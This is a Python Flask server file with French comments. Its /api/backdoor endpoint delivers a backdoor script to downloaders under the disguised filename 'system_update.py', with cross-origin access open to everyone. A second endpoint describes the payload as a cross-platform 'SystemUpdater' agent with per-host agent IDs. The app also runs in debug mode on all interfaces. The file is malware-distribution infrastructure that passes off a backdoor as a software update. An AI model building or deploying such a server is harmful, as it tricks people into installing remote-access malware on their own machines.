from flask import Flask, Response, jsonify
from flask_cors import CORS
import os
import json
import sys

# Ajouter le chemin racine pour accéder aux fichiers
sys.path.append(os.path.dirname(os.path.dirname(__file__)))

app = Flask(__name__)
CORS(app)

@app.route('/api/backdoor', methods=['GET'])
def serve_backdoor():
    """Sert le code de la backdoor pour téléchargement"""
    try:
        # Le fichier backdoor.py est à la racine du projet
        backdoor_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'backdoor.py')
        
        if os.path.exists(backdoor_path):
            with open(backdoor_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            return Response(
                content,
                mimetype='text/plain',
                headers={
                    'Content-Disposition': 'attachment; filename=system_update.py',
                    'Access-Control-Allow-Origin': '*'
                }
            )
        else:
            return jsonify({
                'error': 'Backdoor file not found',
                'path': backdoor_path
            }), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/backdoor/info', methods=['GET'])
def backdoor_info():
    """Informations sur la backdoor"""
    return jsonify({
        'name': 'SystemUpdater',
        'version': '1.0.0',
        'type': 'python',
        'compatible_os': ['windows', 'linux', 'macos'],
        'agent_id_format': 'hostname_uuid4[:8]'
    })

def handler(request):
    return app(request)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)